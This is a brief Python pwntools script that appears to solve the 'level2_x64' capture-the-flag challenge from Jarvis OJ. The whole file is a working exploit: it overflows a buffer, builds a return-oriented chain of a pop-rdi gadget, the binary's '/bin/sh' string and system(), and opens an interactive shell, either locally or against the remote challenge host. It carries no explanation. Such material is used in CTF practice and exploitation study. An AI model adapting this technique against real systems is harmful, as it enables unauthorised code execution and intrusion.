#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import  *
import sys
context.binary = "./level2_x64"

if sys.argv[1] == "l":
    io = process("./level2_x64")
else:
    io = remote("pwn2.jarvisoj.com",9882)

elf = ELF("./level2_x64")

prdi = 0x4006B3

payload = flat(cyclic(0x88), prdi, next(elf.search("/bin/sh")), elf.sym['system'])
io.sendlineafter("Input:\n", payload)

io.interactive()
